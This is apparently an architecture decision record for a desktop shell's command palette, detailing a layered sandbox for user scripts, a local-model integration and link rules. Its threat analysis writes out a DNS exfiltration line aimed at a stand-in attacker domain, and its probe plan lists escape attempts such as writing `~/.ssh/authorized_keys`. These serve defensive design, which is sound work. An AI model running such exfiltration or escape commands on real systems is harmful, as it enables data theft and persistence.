# ADR-0067: The command palette (Search with actions, commands, scripts, links, text replacements and a local model)
Status: Proposed · Date: 2026-11-23 · Decider: owner (scope; D-ext, D-net, D-when, Q-1 and Q-2 answered 2026-11-23);
integrator (design, delegated answers below, merge after review) · Number: 0067 (the next free number on every ref on
2026-11-23: `git log --all` names ADRs up to 0066 and none mentions 0067; `docs/decisions/` ends at ADR-0066)

## Context
The owner asked on 2026-11-23 for a command palette "as Raycast does, with all its features and further if possible", with the
design rule "macOS first": macOS 26 and 27 Spotlight already took several Raycast ideas (actions on results, quick keys, the
clipboard history), so the model is **Spotlight of macOS 27 in structure and look, with Raycast's depth**, and further than
Raycast where Grassfield owns the system.

Grassfield's Search (docs/specs/search.md) already is a Spotlight: apps, Settings pages, calculator, units, five system
commands, files through localsearch and plocate, recent documents, and the clipboard history view (ADR-0034). It has no
actions beyond one per kind, no command catalogue, no aliases, hotkeys, favorites, links, text replacements, scripts or AI.
The inventory, the sourced feature matrix, the UX model and the slice plan are in docs/specs/command-palette.md.

Constraints:
- CLAUDE.md: no new service, dependency, language, directory or abstraction without need; an ADR when something crosses
  modules; security-relevant work gets an opus reviewer.
- master-prompt §5.8: no new daemon without its own ADR. §5.5 and ADR-0024: tokens only, glass by `BackgroundEffect`, A2.
- ADR-0034's privacy rules (PV-1 to PV-14) bind anything that copies, pastes or reads the clipboard.
- Owner delegation (memory "delegated decisions"): decide by "closest to macOS 27, no technical step for the end user";
  legal, public, root, security, spending and irreversible questions go to the owner.

## Owner decisions (2026-11-23, asked with options)
- **D-ext. Extensibility.** Built-in commands plus the user's own **script commands** only: a folder the user fills, read with
  Raycast Script Commands' metadata format, each run as a separate, confined process. **No** third-party extension store and
  **no** distribution of third-party code for now.
- **D-net. Nothing leaves the machine.** A **local** AI model may be used when present (for example Ollama on localhost),
  detected, **opt-in by its presence**. No cloud AI, no currency rates, no web search over the network.
- **D-when. Schedule.** Code starts in parallel with the ongoing capture suite (ADR-0066) as soon as this plan is reviewed.
- **Q-1. Text expansion while typing.** Asked with three options (protected expansion by the compositor / from the palette
  only / later). The owner chose **« Non, depuis la palette »**: Text Replacements are inserted only when the person chooses
  one in Search (D-5). **No keystroke observation**: the expansion-while-typing phase is removed from this plan. Reason (kept
  from the question): expanding as one types needs the compositor to read what is typed in every app, a standing
  keystroke-observation surface that the palette-only model does not need.
- **Q-2. Network for the person's own content.** Asked with three options (on the person's explicit choice / unrestricted /
  never). The owner chose **« Sur ton choix »**:
  - a script runs **without network** unless the person turns on **Allow network** for that script; the choice is remembered
    with the script's approval and reset when the script changes (D-3);
  - a link with an http(s) target opens only when the person picks it (D-7);
  - Grassfield ships no web link and no web fallback.

## Decision

### D-1. The palette is Search, grown; no second surface
The palette lives in `shell/search/` (an existing directory) and uses the existing `grassfield-search` layer, key (Super+Space)
and window. Reasons:
- **macOS model.** macOS 27 puts actions (⌘3, Tab on a result), quick keys and the clipboard history in Spotlight itself
  ([A1], [A2], [A3] in the spec). A second launcher would be the Raycast model, which the owner put below macOS's for UX.
- **Precedent.** ADR-0034 already chose this for the clipboard history (⌘4 in Search, not a separate window).
- **One focus and lock path.** Search already handles exclusive keyboard focus, FocusReturn, the lock refusal and the blur
  region; a second surface would duplicate all four.

What grows:
- a **command catalogue** (`Commands.js`, pure) that replaces the five fixed rows (Search.qml:281) and that providers fill;
- an **Actions** panel on every row (Tab, as macOS 27 [A1]; ⌘K, as Raycast [R2]);
- a **detail pane** (the clipboard preview's place) for long output, answers and conversations, with a pop stack;
- **argument chips** in the capsule (macOS 27: "fill in its fields in the search field" [A2]).

Search.qml is 1050 lines: new logic goes to pure JS modules (`Commands.js`, `Actions.js`, `Placeholders.js`, `ScriptMeta.js`,
`DateCalc.js`, `AiPrompt.js`) with unit tests, and to QML singletons in `shell/search/` (`Scripts.qml`, `LocalModel.qml`,
`CommandStore.qml`). Search.qml only registers providers and dispatches. No new directory: every file goes into an existing
one, including the one new helper, `packaging/bin/grassfield-script-run`, and one new Lua module,
`config/hypr/grassfield/commands.lua`.

A separate window (a chat window, an extensions manager) is **not** built: macOS has none for Spotlight, and the detail pane
covers long answers.

### D-2. Commands, quick keys, keyboard shortcuts and favorites
**Command entry** (`Commands.js`): `{id, title, subtitle, keywords (en, fr, English kept), glyph, kind, provider, args[],
actions[], available(), run(args)}`. Ids match `^[a-z][a-z0-9.-]{0,63}$` (`sys.lock`, `win.tile.left-half`, `set.wifi`,
`script.<sha1-of-path>`, `link.<uuid>`, `text.<uuid>`). Menu items get ephemeral ids that are never stored.

**Every built-in command calls the function the existing UI calls** (Control Center, the menu bar, keys, Settings): `Power`,
`SessionState.requestLock`, `Trash.emptyNow`, `NightShift.setOn`, `Rfkill.setBlocked`, `Settings.*` writers, the `windows`
IPC handler's functions in process (Compositor.qml:1361), `Displays`, `Popups.confirm`. So no command gains a privilege or a
code path that the UI does not already have, and the lock refusal stays where it is.

**Every run goes through one function**, `Commands.run(id, args, origin)` (origin: row, quick key, hotkey, IPC, inline
refresh). Script entries add the D-3 gate there; no origin bypasses it.

**Quick Keys** (macOS 27's name [A2]; Raycast's aliases [R3]): lowercase letters, digits and spaces; an exact match is the first
row, a prefix match next ([R1]); text after a quick key and a space is the first argument ("ft Ashley" [A2]). macOS's
automatic suggested quick keys are not built (a binding the person did not choose is a surprise).

**Keyboard Shortcuts per command** ([R3]):
- Recorded in the Actions panel; refused when the chord collides with `bindings.lua`, `forwarding.lua` (parsed as the Settings
  app's `Bindings.js` does) or Omarchy's binds.
- Stored in `commands.json` (D-8) as `{slot: "k1".."k99", chord, command id}`.
- The shell, the one writer of the palette's files (D-8), writes `$XDG_CONFIG_HOME/grassfield/commands-keys.lua`:
  `k<n> = "<chord>"` pairs only. Like `keyboard.lua`, the file is **read as text and never run**
  (`config/hypr/grassfield/input.lua:62-:70`, `read_table`: review of 2026-10-26, a run chunk could stall the compositor). The
  new module `config/hypr/grassfield/commands.lua`, required by `bindings.lua`, reads it with the same reader and binds only
  chords whose modifiers come from a fixed list and whose key matches `^[A-Za-z0-9_]{1,32}$` or `code:<n>`, skipping any chord
  `bindings.lua` or `forwarding.lua` already binds. **No title, id or user text reaches Hyprland.**
- Each bind sends Hyprland's `event` dispatcher `gfkey/1 search run <slot>`; `Shortcuts.js` gains `search: {run: ["word"]}`,
  so the socket payload stays a checked word; the shell maps the slot to the command and calls `Commands.run` with origin
  `hotkey` (or opens Search on its argument chips). `docs/specs/security.md` "IPC surface" and
  `tests/security/ipc_inventory.sh` list `search run`.
- `shell/platform/SessionConfig.qml` (which already watches `keyboard.lua`, :27) also watches `commands-keys.lua`, so a new
  shortcut applies at once.

**Favorites** ([R1]) show as a strip when the field is empty and at least one exists; with none, the empty field shows
nothing, as today (macOS model, search.md:48).

**Ranking:** the existing decayed usage file (search.md:51) gains `cmd:<id>` keys (version 3, v2 migrated on read); Reset
Ranking per row; menu items, window titles and model answers are never recorded.

### D-3. Script commands: discovery, approval, confinement levels
**Format.** Raycast Script Commands' header ([R16]): `@raycast.<key>` in `#` or `//` comments in the first 64 lines (8 KiB);
`@grassfield.<key>` is accepted as the same key. Required `schemaVersion` (1), `title`, `mode` (`fullOutput`, `compact`,
`silent`, `inline`); optional `packageName`, `icon`, `iconDark`, `currentDirectoryPath`, `needsConfirmation`, `refreshTime`
(inline, ≥ 10 s), `argument1..3` (JSON: `type` text, password or dropdown with `data`, `placeholder`, `optional`,
`percentEncoded`), `author`, `authorURL`, `description`, `platform` (a script that lists only `windows` is hidden).
`.template.` files are skipped. Parsing is pure JS (`ScriptMeta.js`); unknown keys are ignored. The UI never names Raycast
(`tests/ci/ui_names.py` bans it). **Any user-facing sentence saying the format is "compatible with Raycast Script Commands"
(documentation, release notes, the website) waits for the owner's legal review**; the spec may say it.

**Icons.** An `icon` that is an emoji is drawn as plain text. A file icon is read **only after the script is approved**, and
only when it is a relative path that resolves inside the script's own folder to a regular file of at most 256 KiB (links,
FIFOs and devices refused, `O_NOFOLLOW|O_NONBLOCK`); it then goes through `shell/services/image-copy.py`
(docs/specs/security-images.md: the shell decodes only PNGs it produced). An https icon is never fetched (D-net). Otherwise
the generic script glyph.

**Folders.** Settings > Search > Scripts lists folders (Add Folder…, Open Folder, Remove; `search.scriptFolders`). The default
folder, `$XDG_DATA_HOME/grassfield/script-commands/`, is created only by "Open Scripts Folder". A script is listed only when:
- it is a regular file owned by the user, executable, at most 256 KiB, not group- or world-writable;
- its folder is owned by the user and not group- or world-writable;
- a link resolves to a file that passes the same checks.
Folders are watched; a changed file is re-read.

**Approval (macOS model: the first-open prompt for code from elsewhere), enforced on every path.**
- The first run of a script, and the first run after its content changes, asks: "Run “<title>”? It is a script from
  <folder>. It can change your documents, and a changed file, for example in a code project, can run later with your
  rights." with the script's confinement level shown (Cancel, Run).
- An approval is `{path, SHA-256, allowNetwork, allowSession}` in `$XDG_STATE_HOME/grassfield/script-approvals.json` (0600).
  A changed hash drops the approval **and** both permissions.
- **No path runs an unapproved or changed script:** a row's Return, a quick key, a keyboard shortcut and `qs ipc call search
  run` all reach `Commands.run`, which opens Search on the approval prompt instead of running. An inline script shows
  "Needs approval" as its subtitle and is not refreshed until approved.
- **`needsConfirmation` is never skipped:** every origin shows its confirmation in Search before the run; an inline script that
  needs confirmation is never refreshed automatically (its subtitle reads "Run to update").
- **The runner checks too.** `grassfield-script-run` reads the approvals file itself (it does not trust the shell's word),
  reads the script **once into memory** (it is at most 256 KiB), hashes those bytes, refuses when the hash is not the approved
  one, and hands **the same bytes** to the sandbox (step 3 below: they travel in the framed message, and `bwrap --perms 0555
  --ro-bind-data <memfd> <the script's path>` places them at the script's own path). There is no run folder and no second read
  of the file, so a file swapped after the check never runs, and `$0` and sibling files keep working.
- Approvals are never exported or imported (D-8). Forget Approval is an action.

**Process model.** The shell never runs a script in its own process tree. It runs `grassfield-script-run` (Python stdlib,
`-I`, beside `grassfield-capture`), which:
1. performs the checks above;
2. starts `systemd-run --user --wait --pipe --collect --quiet --description="Grassfield script"` (a **fixed** description; the
   unit's command line holds only fixed arguments and the script's path) with `RuntimeMaxSec` (60 s; 10 s for inline),
   `MemoryMax=512M`, `TasksMax=64`, `NoNewPrivileges=yes`: its own cgroup, limits, and a whole-tree kill on timeout;
3. writes one framed message on the unit's stdin (`--pipe`): the script's bytes and their hash, the non-secret arguments and the
   password values. Inside the unit, the runner's sandbox stage (`grassfield-script-run --sandbox`) reads it, hashes the bytes
   again and refuses a mismatch, puts them in a sealed memfd (Python's `os.memfd_create` sets close-on-exec: the stage makes
   the fd inheritable with `os.set_inheritable` and seeks it back to 0 before the exec), and execs
   `bwrap` with the profile of the script's level (below)
   and `--ro-bind-data` from that memfd; it hands the arguments and passwords to the next stage on an inherited pipe (no file
   descriptor crosses `systemd-run`, only its stdin). Inside `bwrap`, the exec stage (`grassfield-script-run --exec`) applies
   the Landlock scopes of the level (below), reads the arguments, and execs the script with the non-secret arguments as
   `$1..$3`, giving it the password values on **its stdin**, one per line in argument order (the password's `$n` is the empty
   string). Arguments therefore never appear in the unit's properties or the journal, and secrets never appear in any argv:
   `/proc/<pid>/cmdline` is readable by every local user. This is the one difference from Raycast's `$n` for passwords, and
   the spec documents it;
4. caps stdout at 1 MiB and 2 000 lines and stderr at 64 KiB, then kills the run; exit 0 is success, any other is a failure
   whose last output line is the message ([R16]).
The shell kills every running script when the session locks (`systemctl --user kill` on the unit, by its recorded name), and
inline refreshes run only while Search is open, at most five scripts.

**Confinement levels (integrator decision, delegated, so that Q-2's answer is a real barrier).** A network namespace cuts
TCP and abstract sockets, but **not file sockets**: on this machine `/etc/resolv.conf` is a link to
`/run/systemd/resolve/stub-resolv.conf` (nameserver 127.0.0.53) and nsswitch's `hosts:` line is `mymachines mdns_minimal
[NOTFOUND=return] resolve files myhostname dns`, so `getent hosts <data>.attacker.tld` through
`/run/systemd/resolve/io.systemd.Resolve` would leak data by DNS from inside a network namespace. `/run` also holds the system
bus (`/run/dbus/system_bus_socket`: NetworkManager, resolve1), CUPS (`/run/cups/cups.sock`), Avahi
(`/run/avahi-daemon/socket`) and Docker (`/run/docker.sock`, root for a member of the docker group), all mode 0666 or
group-accessible (read-only checks, 2026-11-23). So the levels hide **all of `/run`**, not only the runtime directory.

| | **Confined** (default) | **Allow network** (per script, off by default) | **Allow access to my session** (per script, off by default) |
|---|---|---|---|
| Network | new network namespace: a loopback of its own; no internet, no host localhost services | the host's network namespace: internet and the host's localhost TCP services (Ollama, CUPS on 631…) | the host's network, whatever the other switch says (the session can reach it anyway) |
| `/run` (system bus, resolved, CUPS, Avahi, Docker, machined, the runtime directory) | a tmpfs over all of `/run`, with an empty `/run/user/<uid>` (0700) as `XDG_RUNTIME_DIR`; `DBUS_SESSION_BUS_ADDRESS`, `DBUS_SYSTEM_BUS_ADDRESS`, `WAYLAND_DISPLAY`, `DISPLAY`, `HYPRLAND_INSTANCE_SIGNATURE` unset | the same tmpfs, plus **only two files of `/run/systemd/resolve` bound back read-only**: the varlink socket `io.systemd.Resolve` and `stub-resolv.conf` (the target of `/etc/resolv.conf`), so names resolve; not the folder, whose `io.systemd.Resolve.Monitor` is mode 0666 | `/run` bound, with those variables set, **except** `$XDG_RUNTIME_DIR/grassfield` (still hidden); this includes the system bus and, for a docker-group member, Docker |
| DNS | none: `/etc/resolv.conf` dangles, nss `resolve` finds no socket, `mdns_minimal` finds no Avahi, `mymachines` no machined; only `/etc/hosts` and `myhostname` answer | systemd-resolved, through its varlink socket (nss `resolve`) and its stub 127.0.0.53 (nss `dns`); mDNS stays off (no Avahi socket) | the host's |
| Abstract Unix sockets (an Xwayland X11 socket, D-Bus abstract addresses) | refused twice: the network namespace and **Landlock `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET`** | refused by **Landlock `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET`** | allowed |
| Signals to processes outside the sandbox | refused (new PID namespace and **Landlock `LANDLOCK_SCOPE_SIGNAL`**) | same | the PID namespace only |
| X11 file sockets | private `/tmp`: no `/tmp/.X11-unix` | same | `/tmp/.X11-unix` bound |
| Clipboard (ext-data-control), screen, input | unreachable (no Wayland socket) | unreachable | reachable: the script can read the clipboard, start apps, drive Hyprland |
| systemd user manager (`systemd-run --user`, `systemctl --user`) | unreachable | unreachable | **reachable: the script can start processes outside every barrier** |
| Files | `/` read-only. **The home is mounted read-only, then each visible top-level entry (`~/Documents`, `~/Projects`, `~/notes.txt`…) is bound writable.** Hidden entries (`~/.config`, `~/.local`, `~/.ssh`…) stay read-only, and so do absent ones: the home itself is read-only, so no new top-level entry (`~/.zshenv`, `~/.bash_login`, `~/.xprofile`, a new folder) can be created, and nothing can be added under a hidden entry (`~/.ssh/authorized_keys`). **A visible entry that is a link** is bound writable only when its `realpath` is a directory or regular file inside the home's visible part (under a visible top-level entry, never a hidden one nor the home's root itself) or under `/mnt`, `/media` or `/srv`; it is **never** bound when the realpath is, or lies under, `/run`, `/var/run`, `/tmp`, `/var/tmp`, `/dev`, `/proc`, `/sys` or the runtime directory, or when it is a socket, FIFO or device. Such a link stays as it is in the read-only home, so it **dangles** inside the sandbox: its target is under the tmpfs `/run`, the private `/tmp` or the sandbox's own `/dev` and `/proc`. A link to any other place outside the home (`/opt/x`, `/usr/share/y`) is left read-only through the read-only `/`. A top-level entry created by another program during the run stays read-only for that run. **Every script folder is mounted read-only** after the writable binds, and the script's own bytes (`--ro-bind-data`) after that. `~/.cache` is a private tmpfs (many tools need a writable cache), discarded with the run. **Mount order:** `/` read-only, the home read-only, the writable visible entries, the script folders read-only, the script's bytes, the masks, `~/.cache`, and **then** the tmpfs over `/run` (with the level's resolved files), the private `/tmp` and `/var/tmp`, the fresh `/dev` and `/proc`, so the system mounts always win over any home bind. Hidden: `$XDG_STATE_HOME/grassfield`, `$XDG_CONFIG_HOME/grassfield`, `~/.local/share/keyrings`, and known socket files in the home (`~/.gnupg/S.*`, `~/.ssh/*.sock`), masked with `/dev/null` | same as Confined; whatever the script can read it can now send | same as Confined |
| Processes | new PID, IPC and UTS namespaces, `--die-with-parent`, `--new-session` (no TIOCSTI), `NoNewPrivileges`, the systemd limits | same | same, without the Landlock scopes |
| How its effects reach the session | only through the palette: output shown in Search, Copy (the palette copies), Paste (ADR-0034's targeted paste), a notification or HUD the shell posts for `silent` and `compact` | same | also directly |

**Landlock** (kernel LSM; this machine's kernel 7.2.15 reports ABI 10 and lists `landlock` in `/sys/kernel/security/lsm`; the
scopes need ABI ≥ 6). The runner's exec stage calls `landlock_create_ruleset` with `scoped =
LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET | LANDLOCK_SCOPE_SIGNAL` and `landlock_restrict_self` through Python `ctypes` (no new
dependency), in the exec stage, that is after `bwrap` has set the sandbox up and `no_new_privs` is set, and before it execs
the script, at every level except Allow access to my session. `landlock_restrict_self` applies to the calling thread only, so
the exec stage starts no thread (no thread-creating import, a check of `threading.active_count() == 1` and of
`/proc/self/task` before the call). If the ABI is
below 6, Landlock is absent, or a call fails, the script **does not run** at those levels (fail closed); the row says "This
computer cannot confine scripts" and the journal says why.

**Switches.**
- **Allow network** lifts only the network namespace and binds back the two resolved files (`io.systemd.Resolve`,
  `stub-resolv.conf`). Its switch (in the script's Actions
  and its approval prompt) reads: "Allow network: this script can send anything it can read to the internet." Abstract
  sockets and every other `/run` socket stay closed.
- **Allow access to my session** lifts the `/run`, runtime-directory, Wayland, X11, bus and Landlock barriers. Its switch carries
  a plain warning: "This script will be able to read your clipboard, control your windows and start other programs, including
  programs that reach the network. Turn this on only for a script you wrote or fully trust." It is equivalent to running the
  script without confinement, apart from the files rule and the limits.
- Both are off by default, remembered with the approval, reset when the hash changes, and shown on the row (a small glyph).

**Tested for real** (slice X3c): a probe script tries, under each level, `curl` to a host loopback listener and to an outside
address, `getent hosts` of a name only resolved can answer (through nss `resolve` and through 127.0.0.53), `dbus-send
--session` and `dbus-send --system`, `lpstat -r` (the CUPS socket), the presence of `/run/docker.sock` and
`/run/avahi-daemon/socket`, a connection to an Xwayland abstract socket (`@/tmp/.X11-unix/X<n>`, from a test X server when
none runs), `hyprctl version`, `systemd-run --user true`, `wl-paste`, `kill -0` of a process outside, creating `~/.zshenv` and
`~/.ssh/authorized_keys`, writing into a script folder, writing into a visible folder (allowed), reading
`$XDG_STATE_HOME/grassfield/search-usage.json`, and a walk of every socket file it can see (`find / -type s`, which must find
none outside its own `/run/user/<uid>` at the first two levels). Each result must equal the table. If `systemd-run`, `bwrap` or
Landlock refuses a property, the runner **fails closed** and says which.

**Residual risks** (documented, opus review, and said in the approval prompt):
- In every level a script can read and change the files in the visible top-level entries, by design (that is what scripts are
  for). A file it leaves there can **run later with the user's rights** when another program trusts it: Git hooks in a
  project's `.git/hooks`, a direnv `.envrc`, a Makefile or build script, an editor's task or launch file, a desktop launcher
  in `~/Desktop`. The approval prompt says so in plain words (above). Read-only would make scripts useless; per-folder grants
  are a later refinement, not planned now.
- With Allow network a script can send whatever it can read (the whole home, `~/.ssh` included, read-only).
- With Allow access to my session it has the user's full rights.
- A socket file another program creates in a visible folder during a run is reachable (a read-only mount does not stop
  `connect()`); the X3c socket walk catches the known kinds.

### D-4. The local model (D-net)
**Detection.** `LocalModel.qml` asks `http://127.0.0.1:11434/api/version` and `/api/tags` (then `[::1]`) when Search opens,
cached 60 s, through QML `XMLHttpRequest` (no new dependency). The base URL is a constant: no setting, environment variable or
`OLLAMA_HOST` value can point it elsewhere. Slice A1's tests set `http_proxy`, `https_proxy` and `all_proxy` to a fake proxy
and assert that the request reaches the loopback responder directly and the proxy sees nothing. Nothing answers → no AI row
anywhere. Present → the features appear (opt-in by presence, owner); Settings > Search > Local Model can turn them off and
choose the model.

**Listener check (port squatting).** Before the first request, the shell reads `/proc/net/tcp` and `/proc/net/tcp6` (readable
by every user; the shell runs in the host network namespace) and finds the LISTEN entry on 127.0.0.1:11434 or [::1]:11434.
Its `uid` column must be the user's own uid or the uid of the system account named `ollama` in `/etc/passwd` with a uid below
1000 (the packaged service's account; the Arch package's account name is UNCONFIRMED here, since Ollama is not installed: A1
checks the package's sysusers file). Any other uid (another local user listening first) → no AI rows, and a journal line.

**Remote models.** Ollama can serve models that run on a remote service; such a model would send the prompt off the machine,
against D-net. How `/api/tags` or `/api/show` marks them is UNCONFIRMED; slice A1 establishes it from Ollama's API
documentation and a test install, and the rule is **fail closed**: a model that cannot be shown to run locally is not offered.

**What is sent.** Only:
- the text the person typed (Ask Local Model, a follow-up, an argument);
- the placeholders of an AI command the person runs, resolved at that moment: `{clipboard}` (the current clipboard, never the
  history), `{date}` and the like. `{selection}` comes later and only through a "Selected text" chip that shows the exact text
  before Return sends it (the clipboard helper never reads the primary selection today, ADR-0034:118; adding that is its own
  opus-reviewed slice);
- the conversation's previous turns, in a follow-up.
Never: files, the clipboard history, screen contents, window titles, menu items, the Search query of another view.

**What comes back** is plain text, drawn with `Text.PlainText`, never executed, never pasted without the person's choice (Copy
or Paste, the latter through ADR-0034's targeted paste). The model gets no tools and cannot run commands.

**History.** Conversations are in memory and dropped when Search closes, unless "Keep conversations" is on: then 7 days,
`$XDG_STATE_HOME/grassfield/model-conversations.json`, 0600 in 0700, pruned at start, Clear in Settings; Delete Search History
clears it too. Requests are aborted when the session locks.

### D-5. Text replacements: inserted from Search only (owner decision Q-1)
Text Replacements (macOS's name for snippets, System Settings > Keyboard) are rows in Search. Return inserts the expanded text
into the window Search opened over through ADR-0034's targeted paste (PV-14's checks), with the helper's own-copy marker so the
history never records it. `{cursor}` moves the caret with Left keys sent in the same compositor call after the paste. They are
edited in Settings > Keyboard > Text Replacements (the pane settings.md:95 lists as not built) and from the Actions panel. No
keystroke is observed anywhere; nothing in the compositor plugin changes.

**The previous clipboard comes back after the paste.** The paste uses the clipboard, so:
1. Before copying the replacement, the shell asks the helper what owns the selection now. The helper answers with an item id
   when the selection is one of its own copies or a recorded history item (pinned or not), or `none` when it is anything else
   (a hinted or concealed copy it never read, PV-1; a copy made while the history was off; a type it does not keep).
2. The helper serves the replacement. Once the target window has read it (the helper sees its send request finish) or after
   1 s, the helper copies the remembered item again (`copy <id>`), as ADR-0034's copy does.
3. With `none`, the previous content cannot be restored without reading a copy PV-1 forbids reading, so the helper **clears**
   the selection instead: the replacement never lingers on the clipboard. The spec lists this as a known limitation (macOS's
   replacements do not touch the clipboard at all).
The lock, a closed window, or the helper's `L 1` cancel the paste as PV-14 does; the restore (or clear) still runs.

### D-6. Menu items of the focused app (further than Raycast's macOS-only command)
Search lists the menu items of the window it opened over (T1/T2 apps, through the global menu bridge), as Raycast's Search
Menu Bar Items ([R20]) and the macOS Help menu (⇧⌘? [A4]) do. The shell walks the tree that `MenuBridge.qml` already holds,
asking `aboutToShow` for submenus (as opening the menu bar does), capped at depth 4, 500 items and 300 ms. Rows show the path,
the shortcut and the toggle state; Return activates the item (`MenuBridge.activate`) after FocusReturn gives the window back,
and only for that window's address. Labels (which may name documents) are never stored, logged or used for ranking. Slice M1
measures real apps and decides whether a menu/1 additive `layout` request in the bridge is needed (then it is versioned in
menu-bridge.md and ADR-0008's contract table).

### D-7. Links (Raycast's quicklinks)
A link is `{name, target, openWith?, args}`; placeholders as in the spec's T4 (`Placeholders.js`), `{argument}` values
percent-encoded in URLs ([R6]). Opened with `xdg-open` or the app's desktop entry (argv only), and only when the person picks
the link (a row, a quick key or its keyboard shortcut: Q-2).

**Target allowlist** (the same list T2's tests use):
- `https://` and `http://` URLs;
- `mailto:` addresses;
- a **local path** (absolute, or `~/…`), which must exist; a `file://` URL is accepted only with an empty or `localhost` host
  and is turned into its path;
- an **application** (a desktop id that `Apps.isListed` accepts) with an optional target from this list.
Everything else is refused at creation and at open: `javascript:`, `data:`, `blob:`, any other custom scheme handler
(`x-scheme-handler/*` could pass arguments to any app), and network file schemes (`smb:`, `sftp:`, `ftp:`, `dav:`…) whose
opening reaches the network through Files or KIO without the browser's visible address bar.

**A link that would send data the person did not type.** An http(s) or mailto target could carry the clipboard to a web
site in its URL. The rule is decided on the **resolved value**, not on the template:
- `Placeholders.js` records where every substituted piece came from. A piece that comes from the clipboard or the selection,
  directly or through a `{snippet}` whose text contains `{clipboard}` (resolved recursively, at most 3 levels), marks the link
  as **carrying data**. Nesting deeper than 3 levels is **refused** with a message, never treated as data-free. Values the person typed in this run (`{argument}`) and generated values (`{date}`, `{time}`,
  `{datetime}`, `{day}`, `{uuid}`) do not.
- A link carrying data never opens directly, **from any origin** (a row, a quick key, a keyboard shortcut, `qs ipc call
  search run`): Search opens on the detail pane, which shows "This link will open:" and the **full URL, percent-encoded, never
  elided** (wrapped over as many lines as it needs).
- A URL longer than 2 048 characters is refused with a message, so the pane can always show it whole.
- The second Return opens **exactly the string shown**, kept from the first step; nothing is resolved again (the clipboard may
  have changed meanwhile).
Chosen over forbidding the placeholder because it keeps a real use (a dictionary or translation site on the copied word)
while the person sees exactly what leaves, the same "show before send" rule as the local model (D-4); macOS has no quicklinks,
and its nearest model is the browser's visible address bar. Local paths and applications never take `{clipboard}` in a path.

Grassfield ships no web link and no web-search fallback (D-net).

### D-8. Storage, one writer, settings and export
- **User content** (quick keys, keyboard shortcuts, favorites, links, text replacements, user AI commands):
  `$XDG_CONFIG_HOME/grassfield/commands.json`, `{"v": 1, …}`, 0600, read with the JsonSafety rules and caps (1 MiB; 2 000
  items per list).
- **One writer: the shell** (`CommandStore.qml`, through `write-private.sh`, atomic). Reasons: the shell is always running;
  most edits come from Search itself (Actions: add a quick key, a favorite, a link, a shortcut); the shell also generates
  `commands-keys.lua` from the same data; and one writer removes lost updates between two processes. The Settings app's
  Text Replacements and Links panes read the file and **request** changes through the `search` IPC target
  (`addItem(json)`, `updateItem(json)`, `removeItem(id)`, `importFile(path)`), each validated by `CommandStore` (types,
  caps, the link allowlist, at most 64 KiB per call) and refused while the session is locked; the panes follow the file
  when it changes. These functions are listed in `docs/specs/security.md` "IPC surface" (any process of the user can call
  them, as it could write the file; nothing they accept is executable).
- **State** (usage v3, script approvals, calculator history, colour history, kept conversations):
  `$XDG_STATE_HOME/grassfield/`, 0600 in 0700. Delete Search History clears usage, calculator history and conversations.
- **Schema** (`config/schema/grassfield.schema.json`, `search.*`, written by Settings as every setting): `showMenuItems`
  (true), `showSystemState` (true), `showScripts` (true), `scriptFolders` (list), `localModel.enabled` (true; inert without a
  model), `localModel.model` (""), `localModel.keepConversations` (false). One slice at a time edits the schema; the capture
  suite edits it too (spec §4.3).
- **Export / Import** (Settings > Search, through the IPC above): one JSON file of the user content; never clipboard items,
  approvals, permissions, usage or conversations. Raycast's documented snippet and quicklink JSON can be imported ([R4],
  [R5]); imported links pass the allowlist; `.rayconfig` (encrypted, proprietary) is not read.

### D-9. Calculator, dates and time zones
`Calc.js` and `Units.js` grow (percent phrasings, more units, number bases). Dates and time zones go to a new pure
`DateCalc.js`; zone offsets come from the system tzdata through `QTimeZone`, exposed by a small invokable in `Grassfield.Ui`
(C++, `ui/Grassfield/`, an additive API change recorded in docs/specs/ui-api.md and checked by `just check-contracts`).
QML's `Date` has no time-zone support, and running `date` per keystroke would cost a process per answer. Currency stays
excluded (D-net).

### D-10. Dependencies: none new at run time

| Need | Tool | Status |
|---|---|---|
| Script limits and cleanup | systemd-run (systemd) | present on every target system |
| Script namespaces | bubblewrap | grassfield-desktop `depends` already |
| Abstract-socket and signal scopes | Landlock (kernel), called through Python `ctypes` in the runner | the running kernel (ABI ≥ 6; this machine: 10); no package |
| Script icons | `shell/services/image-copy.py` (rsvg-convert) | already |
| Pick Color | hyprpicker | Omarchy base; looked up at use time |
| Paste, copy, restore | wl-clipboard, the clipboard helper | already (the helper gains the "what owns the selection" answer, D-5) |
| Local model | Ollama | **optional**, never required; an `optdepends` line ("ollama: answers from a local model in Search") is documentation only |
| Time zones | Qt 6 `QTimeZone`, system tzdata | already |

Not used: qalc/libqalculate, espanso, a dictionary, any HTTP library (XHR to loopback suffices), any JavaScript engine for
scripts. The compositor plugin is not changed by this plan.

### D-11. Keys and UI names (delegated, macOS 27 first)
- **Tab opens Actions** on the selected row (macOS 27 [A1]); groups move to Page Down/Page Up and Ctrl+↓/↑; search.md S6 and
  F2c are amended in slice P3c. ⌘K (Super+K) also opens Actions if P3c proves it reaches the layer.
- Ctrl+Return stays the secondary action (⌘↩ is Super+Return, the Terminal key).
- UI names: Actions, Quick Keys, Text Replacements, Favorites, Keyboard Shortcut (macOS words); Links, Scripts, Ask Local Model
  (Grassfield words). Never Raycast, Spotlight, Siri, Apple Intelligence, Quick AI, Quicklinks: `tests/ci/ui_names.py` bans
  "Raycast" and "Apple Intelligence" since this ADR (the others were banned already or are not Apple marks).

## Delegated answers (integrator, 2026-11-23, under the owner's delegation)
- **DA-1** One surface (D-1): macOS 27's Spotlight holds actions, quick keys and the clipboard.
- **DA-2** Tab opens Actions (D-11): macOS 27's documented key [A1].
- **DA-3** No suggested quick keys (D-2): no binding the person did not choose.
- **DA-4** A first-run approval for every new or changed script, checked by the shell and again by the runner (D-3).
- **DA-5** Conversations are not kept by default (D-4): privacy first, nothing to clean up.
- **DA-6** Not planned, with reasons in the spec matrix: currency, web search and dictionary (D-net or a new dependency);
  calendar and reminders (no data store); app and site blocking; skin-tone emoji; extensions and store (D-ext); Hyper key.
- **DA-7** French UI wording follows Apple's French guides where they exist (Quick Keys' French name is checked in P5).
- **DA-8** Confinement levels (D-3): confined by default with no network, all of `/run` hidden (no system or session bus, no
  resolved, CUPS, Avahi or Docker), no Wayland or X11, Landlock scopes on abstract sockets and signals, a read-only home with
  only its visible top-level entries writable and the script folders read-only; Allow network lifts only the network
  namespace and binds resolved back; Allow access to my session is a separate, warned switch. This makes the owner's Q-2
  answer hold against a script, not only against Grassfield.
